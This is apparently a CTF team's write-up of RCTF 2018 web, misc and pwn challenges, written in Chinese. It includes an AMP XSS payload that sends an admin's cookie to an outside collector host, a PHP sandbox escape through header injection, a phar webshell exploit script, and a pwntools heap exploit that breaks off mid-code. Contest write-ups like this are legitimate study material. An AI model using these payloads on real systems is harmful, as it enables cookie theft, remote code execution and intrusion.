<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<blockquote>
<p>Team：De1ta</p>
</blockquote>
<h2 data-content="1" id="b0d9a19e9543b0e2b29518a9c536f573">0x00 Web</h2>
<h3 data-content="1" id="8d99f696e823c3ed4ff1e40c4a381e69"><strong>AMP</strong></h3>
<p>由cookie提示flag在admin的cookie 应该是xss</p>
<p>post后会log</p>
<p>应该和amp标准有关 : <a href="https://zh.wikipedia.org/zh-hans/Accelerated_Mobile_Pages" target="_blank">https://zh.wikipedia.org/zh-hans/Accelerated_Mobile_Pages</a></p>
<p>AMP规范 : <a href="https://www.ampproject.org/zh_cn/docs/fundamentals/spec" target="_blank">https://www.ampproject.org/zh_cn/docs/fundamentals/spec</a></p>
<p>猜测使用AMP特性绕过csp打到cookie</p>
<p>AMP获取cookies的方法：<a href="https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id" target="_blank">https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id</a></p>
<p>网页源码里有句注释：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100934-2bb54b36-5d65-1.png"/></p>
<p>payload:</p>
<pre><code>&lt;amp-pixel src="https://487a72b5.2m1.pw/?cid=CLIENT_ID(FLAG)"&gt;&lt;/amp-pixel&gt;

&lt;amp-user-notification
    layout=nodisplay
    id="FLAG"
    data-show-if-href="https://487a72b5.2m1.pw"
    data-dismiss-href="https://487a72b5.2m1.pw"&gt;
    This site uses cookies to personalize content.
    &lt; a href=""&gt;Learn more.&lt;/ a&gt;
   &lt;button on="tap:user-consent.dismiss"&gt;I accept&lt;/button&gt;
&lt;/amp-user-notification&gt;

&lt;!-- Client ID is not provided until `user-consent` is dismissed --&gt;
&lt;amp-pixel src="https://487a72b5.2m1.pw/?cid=CLIENT_ID(FLAG,FLAG)"&gt;&lt;/amp-pixel&gt;</code></pre>
<p>url编码后在浏览器触发<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100934-2bf1bbf2-5d65-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100934-2c32d22c-5d65-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100935-2c4633ee-5d65-1.png"/></p>
<p>flag: <strong>RCTF{El_PsY_CONGRO0_sg0}</strong></p>
<h3 data-content="1" id="712765126a294710c7faddaad5e1d3e5"><strong>r-cursive</strong></h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100935-2c64d790-5d65-1.png"/></p>
<p>访问后在../sandbox/生成一个sha1文件夹，然后复制模板进去，提供了重定向到该文件夹和重置文件夹的功能<br/>
重定向后是个php沙箱，只能执行格式为`xxxx();`的函数<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100935-2c73130a-5d65-1.png"/></p>
<p>可以递归执行函数，不允许带参数<br/>
?cmd=print(readdir(opendir(getcwd()))); 可以列目录<br/>
?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件<br/>
?cmd=print(dirname(dirname(getcwd()))); print出/var/www</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100935-2c849a9e-5d65-1.png"/><br/>
翻阅文档找到`getallheaders()`函数，会返回所有的http请求头，因为header可控，所以可执行任意命令了<br/>
?cmd=print(implode(getallheaders()));<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100935-2c93fbc4-5d65-1.png"/></p>
<p>命令执行：</p>
<div class="highlight"><pre><span></span>GET /?cmd=eval(implode(getallheaders())); HTTP/1.1
cmd: phpinfo(); //
Host: 39093088bf9a9d33d5dd5b973cc1232e2145ee49.sandbox.r-cursive.ml
</pre></div>
<p>接下来沙盒逃逸，从phpinfo看，这里是开了mod_vhost_alias<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100935-2c9f2652-5d65-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100935-2ca85cc2-5d65-1.png"/><br/>
这里是利用auto_prepend来载入sandbox下的init.php来设置沙盒的open_basedir<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100935-2cb30258-5d65-1.png"/><br/>
所以这里通过修改host来逃逸沙盒的open_basedir。</p>
<ol>
<li>正常的open_basedir:</li>
</ol>
<pre><code>GET /?cmd=eval(implode(getallheaders())); HTTP/1.1
cmd: echo ini_get('open_basedir');//
Host: 39093088bf9a9d33d5dd5b973cc1232e2145ee49.sandbox.r-cursive.ml
Content-Length: 4</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100935-2cc32ba6-5d65-1.png"/></p>
<ol>
<li>
<p>把host头的39093088bf9a9d33d5dd5b973cc1232e2145ee49.sandbox去掉：</p>
<div class="highlight"><pre><span></span>GET /?cmd=eval(implode(getallheaders())); HTTP/1.1
cmd: echo ini_get('open_basedir');//
Host: .r-cursive.ml
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100936-2cd4e0d0-5d65-1.png"/><br/>
403是因为webroot没有index.php，正好说明已经逃逸出了沙盒<br/>
所以去访问39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php 即可调用命令</p>
</li>
<li>
<p>借用39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php来执行命令：</p>
<pre><code>GET /39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php?cmd=eval(implode(getallheaders())); HTTP/1.1
cmd: echo ini_get('open_basedir');//
Host:  .r-cursive.ml</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100936-2ce5ea42-5d65-1.png"/></p>
</li>
<li>
<p>拿到flag</p>
<pre><code>GET /39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php?cmd=eval(implode(getallheaders())); HTTP/1.1
cmd: echo ini_get('open_basedir');$myfile=fopen('/var/www/sandbox/init.php','r');echo fread($myfile,9999);//
Host:  .r-cursive.ml</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100936-2cf54762-5d65-1.png"/></p>
</li>
</ol>
<h3 data-content="1" id="4d5c5eeba19ace6cf7748c84d003fde6"><strong>backdoor</strong></h3>
<p>题目的附件在RE 的complier<br/>
解压出来是一个archlinux的ISO,直接扔进vmware启动就行<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100936-2cfdfcf4-5d65-1.png"/></p>
<p>/root文件夹下有helloworld.c和wallpaper.jpg两个文件，图片提取出来一个no_hint.txt：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100936-2d163792-5d65-1.png"/></p>
<p>用wireshark抓取虚拟机用gcc编译时的流量，发现会从<a href="http://backdoor.2018.teamrois.cn/control.sh" target="_blank">http://backdoor.2018.teamrois.cn/control.sh</a><br/>
下载了一个bash脚本：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100936-2d26f9a6-5d65-1.png"/></p>
<p>该脚本的主要工作为：</p>
<blockquote>
<ol>
<li>检测是否有wireshark|tshark|idaq|strace|gdb|edb|lldb|lida|hopper|r2|radare2进程，如果有，就向<a href="http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers发送“Oh" target="_blank">http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers发送“Oh</a>,      no! He's debugging! I'll kill them!!!!!!”，并杀死相关进程；</li>
<li>执行head -c100000 /dev/urandom  &gt; /tmp/random.txt 命令，将/tmp/random.txt打包为zip并发送给<a href="http://backdoor.2018.teamrois.cn/post.php?action=upload" target="_blank">http://backdoor.2018.teamrois.cn/post.php?action=upload</a>
</li>
<li>echo "Did you find the backdoor?" &gt; ~/rctf-backdoor.txt</li>
</ol>
</blockquote>
<p>访问<a href="http://backdoor.2018.teamrois.cn/" target="_blank">http://backdoor.2018.teamrois.cn/</a>：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100936-2d3416e0-5d65-1.png"/></p>
<p>查看源代码，有一段aaencode</p>
<p>解码得到到</p>
<div class="highlight"><pre><span></span><span class="nb">document</span><span class="p">.</span><span class="nx">loginform</span><span class="p">.</span><span class="nx">onsubmit</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> 
    <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">()</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'wp-submit'</span><span class="p">).</span><span class="nx">disabled</span> <span class="o">=</span> <span class="s1">'disabled'</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'wp-submit'</span><span class="p">).</span><span class="nx">removeAttribute</span><span class="p">(</span><span class="s1">'disabled'</span><span class="p">)</span>
        <span class="nx">alert</span><span class="p">(</span><span class="s1">'Login failed'</span><span class="p">)</span>
        <span class="s2">"What? Need hint?"</span>
        <span class="s2">"index.php is a hint!"</span>
    <span class="p">},</span> <span class="mi">3000</span><span class="p">)</span>
<span class="p">}</span>
</pre></div>
<p>意识到这个登陆页没啥用<br/>
在<a href="http://backdoor.2018.teamrois.cn/post.php?action=upload" target="_blank">http://backdoor.2018.teamrois.cn/post.php?action=upload</a><br/>
寻找突破口，发现可以文件读取</p>
<p>读post.php源码</p>
<pre><code>http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=post</code></pre>
<p>post.php</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'action'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'.php'</span><span class="p">;</span>
</pre></div>
<p>读upload.php源码</p>
<p><a href="http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=upload" target="_blank">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=upload</a></p>
<p>upload.php</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]))</span> <span class="k">exit</span><span class="p">;</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
<span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="k">true</span> <span class="o">!==</span> <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s1">'No a valid zip'</span><span class="p">;</span>
    <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">getFromName</span><span class="p">(</span><span class="s1">'tmp/random.txt'</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s1">'No file'</span><span class="p">;</span>
    <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$dest</span> <span class="o">=</span> <span class="s1">'uploads/'</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">])</span> <span class="o">.</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]))</span> <span class="o">.</span> <span class="s1">'.zip'</span><span class="p">;</span>
<span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="nv">$dest</span><span class="p">);</span>
<span class="k">echo</span> <span class="s1">'Saved into '</span> <span class="o">.</span> <span class="nv">$dest</span><span class="p">;</span>
</pre></div>
<p>post.php存在限制后缀的文件包含，可以通过phar://或者zip://协议绕过，从而包含恶意代码getshell，upload.php中限制了上传的文件要是个zip并且里面要有个random.txt文件。</p>
<p>我们在压缩包中再加入一个 evil.php 文件，当通过post.php 访问 action=phar://dest/evil 时，即访问 phar://dest/evil.php  注意 post.php 中的代码<code>include $_GET['action'] . '.php'</code></p>
<p>最终构造exp如下，对应的压缩包tmp.zip已经作为附件上传。</p>
<p>exp.py:</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">s</span> <span class="o">=</span> <span class="s2">"Saved into "</span>
<span class="n">post_url</span> <span class="o">=</span> <span class="s2">"http://backdoor.2018.teamrois.cn/post.php?action=upload"</span>
<span class="n">zip_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"tmp.zip"</span><span class="p">,</span><span class="s2">"rb"</span><span class="p">)</span>
<span class="n">upload_file</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'file'</span><span class="p">:</span><span class="n">zip_file</span><span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">post_url</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">upload_file</span><span class="p">)</span>
<span class="n">dest</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">):]</span>
<span class="n">shell_url</span> <span class="o">=</span> <span class="s2">"http://backdoor.2018.teamrois.cn/post.php?action=phar://"</span><span class="o">+</span> <span class="n">dest</span> <span class="o">+</span> <span class="s2">"/evil"</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"[*] shell url: "</span> <span class="o">+</span> <span class="n">shell_url</span><span class="p">)</span>
<span class="k">while</span>  <span class="bp">True</span><span class="p">:</span>
    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"command: "</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'chybeta'</span><span class="p">:</span> <span class="s1">'system("</span><span class="si">%s</span><span class="s1">");'</span> <span class="o">%</span> <span class="n">command</span><span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">shell_url</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100936-2d47c532-5d65-1.png"/></p>
<h2 data-content="1" id="734c5852ca2856f784a085b1a412fe31">0x01 Misc</h2>
<h3 data-content="1" id="a27899c9851e1706ebf5a6edd7d6105a"><strong>sign</strong></h3>
<p>elf文件，binwalk一下有发现，binwalk提取出其中的png文件，是这样的：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100936-2d55dd84-5d65-1.png"/></p>
<p>提示wine</p>
<p>用wine运行getflag：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100936-2d5fb692-5d65-1.png"/></p>
<h3 data-content="1" id="e8bb56d1c9415526ddefac722ab36e50"><strong>git</strong></h3>
<p>给了个git文件夹，估计flag是藏在提交历史里，<br/>
getflag：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100937-2d86aba8-5d65-1.png"/></p>
<h3 data-content="1" id="0156fc32dc21c52ed5299cf08e84349a"><strong>cats</strong></h3>
<p>题目要求找出15个命令xxx，使得xxx food的输出结果等于cat food的输出结果<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100937-2d992a76-5d65-1.png"/></p>
<p>在本地docker测试可以免掉验证码</p>
<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s1">'food'</span>&gt;yourCatFood
docker run -it --rm --network none -v /tmp/yourCatFood:/app/food:ro rctf_cats bash -c <span class="s2">"timeout 5 diff -Z &lt;(cat food) &lt;(xxxx food)"</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100937-2da41ac6-5d65-1.png"/></p>
<p>后来想到把food内容也设置为`food`，这样cat food就等于ls food等于echo<br/>
food了，用这种方法找出15个可用的命令，然后拿到flag<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100937-2dd819d4-5d65-1.png"/></p>
<h3 data-content="1" id="2b425ac606a9bd5073a7e2f5657f236d"><strong>cats Rev.2</strong></h3>
<p>在1的基础上</p>
<p>If you can find at least 4 out of 5 cats whose names in (python3, bash, php,<br/>
node, ruby), I will give you another flag ._.</p>
<p>看来就是命令绕过了，1中只用到了php</p>
<p>一开始陷入误区，打算用软链接来替换掉命令</p>
<p>如</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">"ln -s /bin/cat /usr/local/sbin/gg"</span><span class="p">)</span>
<span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">'food'</span><span class="p">,</span><span class="s1">'r'</span><span class="p">)</span>
<span class="n">data</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</pre></div>
<p>提交python3,gg,.....</p>
<p>但是，后来发现应该是将所有cat的名字分别代入到</p>
<div class="highlight"><pre><span></span>sudo docker run -it --rm --network none -v /tmp/yourCatFood:/app/food:ro
rctf_cats bash -c <span class="s2">"timeout 5 diff -Z \&lt;(cat food) \&lt;(yourCatName food)"</span>
</pre></div>
<p>所以，每个环境都是独立的，相互不影响，所以需要写一个脚本是（python3,bash,node,ruby）中3个运行输出与cat一样的（php只要不写”\&lt;?php”，直接原样输出）。</p>
<p>跟cat一致，那就是读取文件内容并输出了。</p>
<p>python3</p>
<div class="highlight"><pre><span></span><span class="k">print</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">'food'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">());</span>
</pre></div>
<p>ruby</p>
<div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">'food'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">());</span>
</pre></div>
<p>bash</p>
<div class="highlight"><pre><span></span>cat food
</pre></div>
<p>node</p>
<pre><code>fs=require('fs');
var data=fs.readFileSync('food','utf-8');
console.log(data);</code></pre>
<p>接下来是考虑整合了。</p>
<p>通过解析的差异和适当的exit来整合。</p>
<div class="highlight"><pre><span></span><span class="nb">echo</span> cat food<span class="p">;</span>
</pre></div>
<p>在bash下输出文件内容，在ruby、node下无输出</p>
<div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">'food'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">());</span>
</pre></div>
<p>ruby运行OK，node运行报函数未定义，so，定义下函数</p>
<div class="highlight"><pre><span></span><span class="n">function</span> <span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">){</span>
<span class="n">fs</span><span class="o">=</span><span class="nb">require</span><span class="p">(</span><span class="s1">'fs'</span><span class="p">);</span>
<span class="n">var</span> <span class="n">data</span><span class="o">=</span><span class="n">fs</span><span class="o">.</span><span class="n">readFileSync</span><span class="p">(</span><span class="s1">'food'</span><span class="p">,</span><span class="s1">'utf-8'</span><span class="p">);</span>
<span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">function</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">){</span><span class="k">return</span> <span class="p">{</span><span class="ss">read</span><span class="p">:</span><span class="n">function</span><span class="p">(){}}}</span>
<span class="n">function</span> <span class="nb">exit</span><span class="p">(){}</span>
</pre></div>
<p>所以，结合起来</p>
<p>本地测试的时候，node是要去掉后面的回车</p>
<div class="highlight"><pre><span></span><span class="nb">echo</span> cat food<span class="p">;</span>
<span class="nb">echo</span> exit<span class="p">;</span>
print<span class="o">(</span>open<span class="o">(</span><span class="s1">'food'</span><span class="o">)</span>.read<span class="o">())</span><span class="p">;</span>exit<span class="o">()</span><span class="p">;</span>
<span class="k">function</span> print<span class="o">(</span>data<span class="o">){</span>
<span class="nv">fs</span><span class="o">=</span>require<span class="o">(</span><span class="s1">'fs'</span><span class="o">)</span><span class="p">;</span>
var <span class="nv">data</span><span class="o">=</span>fs.readFileSync<span class="o">(</span><span class="s1">'food'</span>,<span class="s1">'utf-8'</span><span class="o">)</span><span class="p">;</span>
console.log<span class="o">(</span>data.slice<span class="o">(</span><span class="m">0</span>,-1<span class="o">))</span><span class="p">;</span>
<span class="o">}</span>

<span class="k">function</span> open<span class="o">(</span>filename<span class="o">){</span><span class="k">return</span> <span class="o">{</span>read:function<span class="o">(){}}}</span>
<span class="k">function</span> exit<span class="o">(){}</span>
</pre></div>
<p>但是，答题那里不用去掉末尾的回车，要改成</p>
<div class="highlight"><pre><span></span><span class="nb">echo</span> cat food<span class="p">;</span>
<span class="nb">echo</span> exit<span class="p">;</span>
print<span class="o">(</span>open<span class="o">(</span><span class="s1">'food'</span><span class="o">)</span>.read<span class="o">())</span><span class="p">;</span>exit<span class="o">()</span><span class="p">;</span>
<span class="k">function</span> print<span class="o">(</span>data<span class="o">){</span>
<span class="nv">fs</span><span class="o">=</span>require<span class="o">(</span><span class="s1">'fs'</span><span class="o">)</span><span class="p">;</span>
var <span class="nv">data</span><span class="o">=</span>fs.readFileSync<span class="o">(</span><span class="s1">'food'</span>,<span class="s1">'utf-8'</span><span class="o">)</span><span class="p">;</span>
console.log<span class="o">(</span>data<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
<span class="k">function</span> open<span class="o">(</span>filename<span class="o">){</span><span class="k">return</span> <span class="o">{</span>read:function<span class="o">(){}}}</span>
<span class="k">function</span> exit<span class="o">(){}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100937-2df452f2-5d65-1.png"/></p>
<h3 data-content="1" id="3c0080c038ace94c0ff6557e96731e14"><strong>Number Game</strong></h3>
<p>o<strong> </strong>o             o<strong> </strong>o    <strong>__o</strong> <strong>o__</strong>   o<strong> </strong>o_<em>/</em></p>
<p>&lt;|     v\           /v     v\    /   \   /   \   &lt;|    v</p>
<p>/ \     &lt;\         /&gt;       &lt;\        \o/        &lt; &gt;</p>
<p>\o/     o/       o/                    |          |</p>
<p>|<strong>  _&lt;|       &lt;|                    &lt; &gt;         o</strong>/_</p>
<p>|       \       \                    |          |</p>
<p>&lt;o&gt;       \o       \         /         o         &lt;o&gt;&lt;/o&gt;&lt;/o&gt;</p>
<p>|         v\       o       o         &lt;|          |</p>
<p>/ \         &lt;\      &lt;__ __/&gt;         / \        / \</p>
<p>In every round of the game, I'll choose some different numbers from the figure<br/>
interval. You are required to guess those numbers,ofc so does the order of them.</p>
<p>On each surmise of yours, 2 numbers will be told as a hint for you, but you need<br/>
to speculate the fuctions of these 2 figures. (XD</p>
<p>GLHF</p>
<p>================== round 1 ==================</p>
<p>Give me 4 numbers, in[0, 10), You can only try 6 times</p>
<p><a href="https://github.com/AustinGuo/GessNumber" target="_blank">https://github.com/AustinGuo/GessNumber</a><br/>
脚本可以生成每关结果，然后半自动玩游戏23333<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100938-2e08a63a-5d65-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100938-2e20e858-5d65-1.png"/></p>
<h3 data-content="1" id="2f00f9c35c0b25d94b1edc4634d2a22b"><strong>520gift</strong></h3>
<p>找出美妆博主：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100938-2e3ed138-5d65-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100938-2e49d2b8-5d65-1.png"/><br/>
flag：<strong>RCTF{rbdlmlombrslj}</strong></p>
<h2 data-content="1" id="ebb4cf09bf103046c45ed4eaece69782">0x02 Pwn</h2>
<h3 data-content="1" id="cc908cb7da2f7eae7d30d10d88cdedda"><strong>BabyHeap</strong></h3>
<p>最基础的off by null<br/>
chunk overlap + fastbin attack 极限利用.....做起来很不舒服......<br/>
思路首先是利用off by null来chunk overlap ， chunk overlap之后利用fast bin<br/>
attack来get shell，基本上全是套路.........</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">debug</span><span class="o">=</span><span class="mi">0</span>
<span class="n">e</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc.so'</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
    <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">'./babyheap'</span><span class="p">,</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">'LD_PRELOAD'</span><span class="p">:</span><span class="s1">'./libc.so'</span><span class="p">})</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">'babyheap.2018.teamrois.cn'</span><span class="p">,</span><span class="mi">3154</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ru</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">se</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">sz</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">se</span><span class="p">(</span><span class="s1">'1</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'please input chunk size:'</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">sz</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'input chunk content:'</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'choice:'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">se</span><span class="p">(</span><span class="s1">'2</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'please input chunk index:'</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'content: '</span><span class="p">)</span>
    <span class="n">data</span><span class="o">=</span><span class="n">ru</span><span class="p">(</span><span class="s1">'1. '</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'choice:'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">data</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">se</span><span class="p">(</span><span class="s1">'3</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'please input chunk index:'</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'choice:'</span><span class="p">)</span>

<span class="c1">#-------------init----------------</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="s1">'0</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0xf9</span><span class="p">,(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
